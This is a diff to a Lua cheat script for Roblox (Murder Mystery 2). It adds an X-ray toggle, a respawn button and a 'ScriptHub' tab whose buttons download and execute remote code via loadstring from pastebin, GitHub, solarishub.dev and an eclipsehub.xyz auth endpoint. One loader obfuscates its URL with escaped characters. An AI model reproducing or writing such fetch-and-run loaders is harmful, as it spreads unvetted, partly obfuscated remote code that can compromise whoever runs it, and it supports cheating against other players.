@@ -61,6 +61,8 @@ local Tab7= Window:NewTab("AnimationToggle(BETA)")
 local Tab7Section = Tab7:NewSection("Sit, Headless and others..") 
 local Tab8 = Window:NewTab("Settings") 
 local Tab8Section = Tab8:NewSection("Set something..")
+local Tab9 = Window:NewTab("ScriptHub") 
+local Tab9Section = Tab9:NewSection("See here script hubs for mm2")
 
 -- Buttons/Windows/Idk
 
@@ -265,6 +267,22 @@ Tab1Section:NewButton("Click Tp Tool", "goto", function()
 print("Executed")
 
 loadstring(game:HttpGet("https://pastebin.com/raw/GuBiX19e",true))()
+end)
+
+Tab2Section:NewToggle("X-Ray", "View(no esp)", function(xray)
+if xray then
+    for _,v in pairs(obj:GetChildren()) do
+        if (v:IsA("BasePart")) and not v.Parent:FindFirstChild("Humanoid") then
+            v.LocalTransparencyModifier = 0.75
+            end
+         end
+else
+    for _,v in pairs(obj:GetChildren()) do
+        if (v:IsA("BasePart")) and not v.Parent:FindFirstChild("Humanoid") then
+            v.LocalTransparencyModifier = 0
+            end
+            end
+end
 end)
 
 Tab2Section:NewButton("Player Name", "Name", function()
@@ -502,6 +520,12 @@ end
 end)
 end)
 
+Tab3Section:NewButton("Respawn", "Respawn", function()
+Character.Head:Remove()
+		Humanoid.BreakJointsOnDeath = false
+		Humanoid.Health = 0
+end)
+
 Tab3Section:NewTextBox("View Player"," View your enemies", function(args, speaker)
 	StopFreecam()
 	local players = getPlayer(args[1], speaker)
@@ -654,3 +678,34 @@ Tab8Section:NewColorPicker("Color FolderHub", "Change You Color FolderHub", Colo
     end)
 end
 end)
+
+Tab9Section:NewLabel("Best Scripts for Any Games")
+
+Tab9Section:NewButton("Infinite Yield", "Infinite Yield", function()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
+end)
+
+Tab9Section:NewLabel("mm2 scripts")
+
+Tab9Section:NewButton("EclipseGui(Mobile + No Crash)", "Give Someone your tools", function()
+local a,b,c,d=loadstring,"ht\116ps:",{[0XDD4]=function(f)return game:HttpGetAsync(f)end,["User"]="r\97w\46\103\105t\104\117b\117\115er\99\111\110t\101\110t\46c\111m",["Author"]={"Zoi8752","ItsJiDy"},["Scripts"]="SymphonyHub",["File"]="\83cr\105p\116"},string.format;e=a(c[3540](b.."//"..c["User"].."/"..c["Author"][1].."/"..c["Scripts"].."/main/"..c["File"]))if e then e(d("Your Executor Does not Support. %s",c["Author"][2]))end
+end)
+
+Tab9Section:NewButton("Vynixus", "Give Someone your tools", function()
+loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
+end)
+
+Tab9Section:NewButton("SolarushGui", "Give Someone your tools", function()
+loadstring(game:HttpGet('https://solarishub.dev/script.lua',true))()
+end)
+
+Tab9Section:NewButton("EclipseGui", "Give Someone your tools", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ethanoj1/EclipseMM2/master/Script", true))()
+end)
+
+Tab9Section:NewButton("EclipseHub", "Give Someone your tools", function()
+getgenv().mainKey = "nil"
+ 
+local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
+end)
+
